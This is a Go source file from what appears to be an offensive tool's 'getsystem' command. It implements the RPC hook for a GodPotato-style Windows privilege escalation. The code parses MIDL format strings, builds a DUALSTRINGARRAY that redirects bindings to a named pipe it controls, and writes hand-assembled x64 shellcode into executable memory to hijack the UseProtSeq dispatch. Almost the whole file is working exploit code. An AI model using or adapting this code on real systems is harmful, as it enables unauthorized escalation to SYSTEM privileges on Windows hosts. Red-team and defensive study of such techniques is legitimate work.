//go:build windows
// +build windows

// getsystem_potato_hook.go contains the RPC dispatch hook mechanics:
// MIDL format string parsing, DUALSTRINGARRAY construction, native x64
// shellcode generation, and hook state management.

package commands

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func utf16Encode(s string) []uint16 {
	result, _ := syscall.UTF16FromString(s)
	// Remove trailing null
	if len(result) > 0 && result[len(result)-1] == 0 {
		result = result[:len(result)-1]
	}
	return result
}

// readUseProtSeqParamCount reads the UseProtSeq parameter count from the MIDL
// NDR format string. GodPotato reads this at ProcString + FmtStringOffset[0] + 19.
// The parameter count varies by Windows version (typically 5-6 on modern Windows).
func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
	if midlInfo.ProcString == 0 || midlInfo.FmtStringOffset == 0 {
		return 0, fmt.Errorf("ProcString or FmtStringOffset is null")
	}
	// FmtStringOffset is an array of uint16; read offset for method 0 (UseProtSeq)
	fmtOffset0 := *(*uint16)(unsafe.Pointer(midlInfo.FmtStringOffset))
	// Parameter count is at offset 19 within the Oif procedure header
	paramCount := int(*(*byte)(unsafe.Pointer(midlInfo.ProcString + uintptr(fmtOffset0) + 19)))
	if paramCount < 4 || paramCount > 14 {
		return 0, fmt.Errorf("unexpected UseProtSeq parameter count: %d", paramCount)
	}
	return paramCount, nil
}

// buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
// Uses the same full-text format as GodPotato/RustPotato: each endpoint string
// (including protocol prefix) is written directly as UTF-16, with no separate
// tower ID field. The security section is left empty (zero-filled).
// This is called during setup (before hook install) so the callback itself
// does only minimal work: HeapAlloc + memcpy + pointer write.
func buildPipeDSA(pipeUniqueName string) []byte {
	// Full text endpoint strings — matches GodPotato/RustPotato format exactly.
	// No separate tower ID prefix; the protocol name is part of the text.
	endpoints := []string{
		`ncacn_np:localhost/pipe/` + pipeUniqueName + `[\pipe\epmapper]`,
		`ncacn_ip_tcp:safe !`,
	}

	// Calculate entrie_size: sum of (len+1) for each endpoint + 1 for end marker + 2 for security padding
	entrieSize := 0
	for _, ep := range endpoints {
		entrieSize += len(ep) + 1 // +1 for null terminator
	}
	entrieSize += 1 // end of string bindings marker (extra null)
	securityOffset := entrieSize
	entrieSize += 2 // empty security section (just a double-null terminator)

	// Allocate: 4 bytes header (wNumEntries + wSecurityOffset) + entries as UTF-16
	totalBytes := 4 + entrieSize*2
	result := make([]byte, totalBytes)

	// Header
	binary.LittleEndian.PutUint16(result[0:2], uint16(entrieSize))
	binary.LittleEndian.PutUint16(result[2:4], uint16(securityOffset))

	// Write endpoints as UTF-16LE characters
	offset := 4
	for _, ep := range endpoints {
		for _, ch := range ep {
			binary.LittleEndian.PutUint16(result[offset:offset+2], uint16(ch))
			offset += 2
		}
		offset += 2 // null terminator (already zero from make)
	}
	// Remaining bytes are zero (end of string bindings + empty security section)

	return result
}

// hookFlagOffset is the offset within the shellcode page where the hook-called
// flag byte is stored. The shellcode sets this to 1 when UseProtSeq is called.
const hookFlagOffset = 128

// Diagnostic offsets: saved parameter values for debugging.
// The shellcode saves all 5 parameters at these offsets on the page.
const (
	diagParamBase = 136 // offset for first saved param (RCX)
	// 136: RCX (param 0), 144: RDX (param 1), 152: R8 (param 2),
	// 160: R9 (param 3), 168: [RSP+0x28] (param 4)
)

// buildNativeHook creates a native x64 shellcode hook for the UseProtSeq dispatch.
// Using raw shellcode instead of syscall.NewCallback avoids crashes caused by Go's
// callback trampoline interacting with the NDR interpreter's RPC dispatch thread.
// ppdsaNewBindings is always the second-to-last parameter (paramCount-2).
// This matches GodPotato/RustPotato: fun(p[N-2], p[N-1]) where N=paramCount.
// x64 calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, [RSP+0x28]=p4, etc.
func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err error) {
	ppdsaIndex := paramCount - 2
	code := make([]byte, 0, 256)

	// Diagnostic: Save all parameter registers to known page offsets.
	// This lets Go-side code read back the actual values for debugging.
	// We use R11 as scratch (caller-saved, not used by NDR for params).
	// mov r11, <pageAddr> — will be patched after VirtualAlloc
	code = append(code, 0x49, 0xBB) // mov r11, imm64
	diagBaseSlot := len(code)
	code = append(code, 0, 0, 0, 0, 0, 0, 0, 0) // placeholder

	// Save RCX at [r11+0]
	code = append(code, 0x49, 0x89, 0x0B) // mov [r11], rcx
	// Save RDX at [r11+8]
	code = append(code, 0x49, 0x89, 0x53, 0x08) // mov [r11+8], rdx
	// Save R8 at [r11+16]
	code = append(code, 0x4D, 0x89, 0x43, 0x10) // mov [r11+16], r8
	// Save R9 at [r11+24]
	code = append(code, 0x4D, 0x89, 0x4B, 0x18) // mov [r11+24], r9
	// Save [RSP+0x28] at [r11+32] — 5th param (first stack param)
	code = append(code, 0x48, 0x8B, 0x44, 0x24, 0x28) // mov rax, [rsp+0x28]
	code = append(code, 0x49, 0x89, 0x43, 0x20)       // mov [r11+32], rax

	// Step 1: Load ppdsaNewBindings into RAX from the correct parameter position.
	// x64 Windows calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, stack=p4+
	switch ppdsaIndex {
	case 0:
		code = append(code, 0x48, 0x89, 0xC8) // mov rax, rcx
	case 1:
		code = append(code, 0x48, 0x89, 0xD0) // mov rax, rdx
	case 2:
		code = append(code, 0x4C, 0x89, 0xC0) // mov rax, r8
	case 3:
		code = append(code, 0x4C, 0x89, 0xC8) // mov rax, r9
	default:
		// Stack parameter: [RSP + 8*(ppdsaIndex+1)]
		// +1 accounts for the return address pushed by CALL
		offset := byte(8 * (ppdsaIndex + 1))
		code = append(code, 0x48, 0x8B, 0x44, 0x24, offset) // mov rax, [rsp+offset]
	}

	// Step 2: test rax, rax — check for null pointer
	code = append(code, 0x48, 0x85, 0xC0)

	// Step 3: jz done — skip writes if null
	// Calculate jump distance: DSA write (13) + flag write (13) = 26 bytes
	code = append(code, 0x74, 0x1A) // jz done (jump 26 bytes)

	// Step 4: mov rcx, <dsaBufAddr> — load pre-allocated DSA address
	addrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrBytes, uint64(dsaBufAddr))
	code = append(code, 0x48, 0xB9) // mov rcx, imm64
	code = append(code, addrBytes...)

	// Step 5: mov [rax], rcx — write DSA address to *ppdsaNewBindings
	code = append(code, 0x48, 0x89, 0x08)

	// Step 6: Set hook-called flag at page+hookFlagOffset
	// mov rax, <flagAddr> — will be patched after VirtualAlloc
	code = append(code, 0x48, 0xB8) // mov rax, imm64
	flagAddrSlot := len(code)       // remember where to patch
	code = append(code, 0, 0, 0, 0, 0, 0, 0, 0)

	// mov byte [rax], 1
	code = append(code, 0xC6, 0x00, 0x01)

	// done:
	// Step 7: xor eax, eax — return 0 (RPC_S_OK)
	code = append(code, 0x33, 0xC0)

	// Step 8: ret
	code = append(code, 0xC3)

	// Allocate executable memory and copy shellcode
	page, allocErr := windows.VirtualAlloc(0, 4096,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if allocErr != nil {
		return 0, fmt.Errorf("allocate hook shellcode memory: %w", allocErr)
	}

	// Patch the flag address now that we know the page address
	flagAddr := page + hookFlagOffset
	binary.LittleEndian.PutUint64(code[flagAddrSlot:], uint64(flagAddr))

	// Patch the diagnostic base address
	binary.LittleEndian.PutUint64(code[diagBaseSlot:], uint64(page+diagParamBase))

	dst := unsafe.Slice((*byte)(unsafe.Pointer(page)), len(code))
	copy(dst, code)

	potatoGlobal.shellcodePage = page
	return page, nil
}

// wasHookCalled checks the shellcode flag byte to determine if UseProtSeq was triggered.
func wasHookCalled() bool {
	if potatoGlobal.shellcodePage == 0 {
		return false
	}
	flag := *(*byte)(unsafe.Pointer(potatoGlobal.shellcodePage + hookFlagOffset))
	return flag != 0
}

// readDiagParams reads the saved parameter values from the shellcode page.
// Returns the 5 saved register/stack values: RCX, RDX, R8, R9, [RSP+0x28].
func readDiagParams() [5]uintptr {
	var params [5]uintptr
	if potatoGlobal.shellcodePage == 0 {
		return params
	}
	base := potatoGlobal.shellcodePage + diagParamBase
	for i := 0; i < 5; i++ {
		params[i] = *(*uintptr)(unsafe.Pointer(base + uintptr(i*8)))
	}
	return params
}

// allocateDSAOnHeap allocates the DUALSTRINGARRAY on the process heap using HeapAlloc.
// The RPC runtime expects heap-allocated memory (it calls MIDL_user_free = HeapFree).
func allocateDSAOnHeap(dsaData []byte) (uintptr, error) {
	hHeap, _, _ := procGetProcessHeap.Call()
	if hHeap == 0 {
		return 0, fmt.Errorf("GetProcessHeap returned null")
	}
	buf, _, callErr := procHeapAlloc.Call(hHeap, 0x08, uintptr(len(dsaData)))
	if buf == 0 {
		return 0, fmt.Errorf("HeapAlloc(%d bytes): %w", len(dsaData), callErr)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), len(dsaData))
	copy(dst, dsaData)
	potatoGlobal.dsaHeapBuf = buf
	return buf, nil
}
